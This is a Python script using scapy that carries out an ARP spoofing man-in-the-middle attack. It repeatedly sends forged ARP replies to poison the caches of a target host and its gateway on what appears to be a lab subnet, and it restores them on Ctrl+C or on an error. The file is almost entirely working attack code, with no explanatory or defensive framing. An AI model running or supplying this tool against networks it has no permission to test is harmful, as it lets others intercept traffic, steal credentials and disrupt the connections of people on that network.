from scapy.all import Ether, ARP, srp, send
import time


def get_mac(ip):
    """ Using arp protocol to get mac address """
    try:
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp_request
        answered_list = srp(packet, timeout=2, verbose=False)[0]
        return answered_list[0][1].hwsrc
    except IndexError:
        print(f"[!] Could not find MAC address for IP: {ip}")
        return None
    except Exception as e:
        print(f"[!] Error in get_mac: {e}")
        return None


def spoof(target_ip, host_ip, verbose=True):
    """ Spoofing the target IP to think that the host IP is the target IP """
    try:
        target_mac = get_mac(target_ip)
        if not target_mac:
            print(f"[!] Skipping spoofing for {target_ip} as MAC address could not be resolved.")
            return
        arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at') # create fake arp response that will be sent to the target
        send(arp_response, verbose=0)
        if verbose: # print log if verbose is True
            self_mac = ARP().hwsrc
            print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
    except Exception as e:
        print(f"[!] Error in spoof: {e}")


def restore(target_ip, host_ip, verbose=True):
    """ This function is used to restore the network by sending the real MAC address of the host to the target IP """
    try:
        target_mac = get_mac(target_ip)
        host_mac = get_mac(host_ip)
        if not target_mac or not host_mac:
            print(f"[!] Skipping restore for {target_ip} or {host_ip} as MAC address could not be resolved.")
            return
        arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at") #create arp packet with the real mac address of the host
        send(arp_response, verbose=0, count=7)
        if verbose: # print log if verbose is True
            print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
    except Exception as e:
        print(f"[!] Error in restore: {e}")


if __name__ == "__main__":
    target = "192.168.91.129"
    host = "192.168.91.2"  # default gateway / router
    verbose = True

    try:
        while True:
            spoof(target, host, verbose) # spoof the target arp table
            spoof(host, target, verbose) # spoof the router arp table to create man in the middle
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C! Restoring the network...")
        restore(target, host) # restore target
        restore(host, target) # restore router
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        print("[!] Attempting to restore the network...")
        restore(target, host) # restore target
        restore(host, target) # restore router